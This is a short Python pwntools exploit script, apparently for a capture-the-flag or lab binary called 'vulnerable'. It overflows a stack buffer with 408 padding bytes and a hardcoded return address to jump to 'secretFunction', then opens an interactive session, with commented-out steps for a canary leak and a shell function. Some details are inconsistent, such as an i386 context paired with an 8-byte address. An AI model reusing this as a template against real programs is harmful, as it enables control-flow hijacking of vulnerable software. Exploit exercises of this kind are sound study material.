#!/usr/bin/python3
# -*- ascll -*-
# Payload generator
from struct import pack
from pwn import *

# context.binary = 'vulnerable'
# context.log_level = 'debug'
context(arch = 'i386', os = 'linux', binary = 'vulnerable', log_level = 'debug')

p = process('./vulnerable', aslr=False)

elf = ELF("./vulnerable")
log.info("Canary: {}".format(elf.canary))

secretFunction = elf.sym["secretFunction"]
log.info("secretFunction: {:x}".format(secretFunction))
# getShell = elf.sym["getShell"]
# log.info("getShell: {:x}".format(getShell))

p.recvuntil("Enter some text:\n".encode(encoding="ASCII"))

# leak Canary
# payload = "{}{}".format("A"*408, p64(secretFunction))
payload = "A"*408
p.send(payload.encode(encoding='ascii'))
p.send("\x46\x11\x40\x00\x00\x00\x00\x00".encode(encoding='ascii'))
# p.recvuntil("\x46\x11\x40\x00\x00\x00\x00\x00".encode(encoding='ascii'))
p.recv()

p.interactive()